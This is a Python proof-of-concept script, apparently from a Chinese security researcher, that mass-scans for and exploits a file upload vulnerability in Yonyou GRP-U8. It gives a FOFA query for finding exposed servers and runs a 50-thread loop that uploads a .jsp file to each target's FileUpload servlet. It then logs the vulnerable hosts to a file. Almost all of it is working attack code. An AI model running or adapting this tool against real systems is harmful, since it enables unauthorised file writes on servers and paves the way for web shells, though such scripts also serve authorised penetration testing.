# 用友GRP-U8 FileUpload 文件上传漏洞
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app="用友-GRP-U8"

def banner():
    test = """
██╗   ██╗██╗   ██╗      ██████╗ ██████╗ ██████╗       ██╗   ██╗ █████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝     ██╔════╝ ██╔══██╗██╔══██╗      ██║   ██║██╔══██╗
 ╚████╔╝  ╚████╔╝      ██║  ███╗██████╔╝██████╔╝█████╗██║   ██║╚█████╔╝
  ╚██╔╝    ╚██╔╝       ██║   ██║██╔══██╗██╔═══╝ ╚════╝██║   ██║██╔══██╗
   ██║      ██║███████╗╚██████╔╝██║  ██║██║           ╚██████╔╝╚█████╔╝
   ╚═╝      ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝            ╚═════╝  ╚════╝ 
                                                                       
                                                author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='用友GRP-U8 FileUpload 文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/servlet/FileUpload?fileName=ccsxxzjx.jsp&actionID=update"
    headers = {
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:105.0)Gecko/20100101Firefox/105.0',
        'Content-Length':'43',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection':'close'
    }
    data = "1111111"

    try:
        response = requests.post(url=target+api_payload,headers=headers,data=data,timeout=10,verify=False)
        path = "/R9iPortal/upload/ccsxxzjx.jsp"
        if response.status_code == 200:
            print(f"[+]{target} 存在文件上传漏洞，文件上传的路径为：{target}{path}")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在文件上传漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")



if __name__ == '__main__':
    main()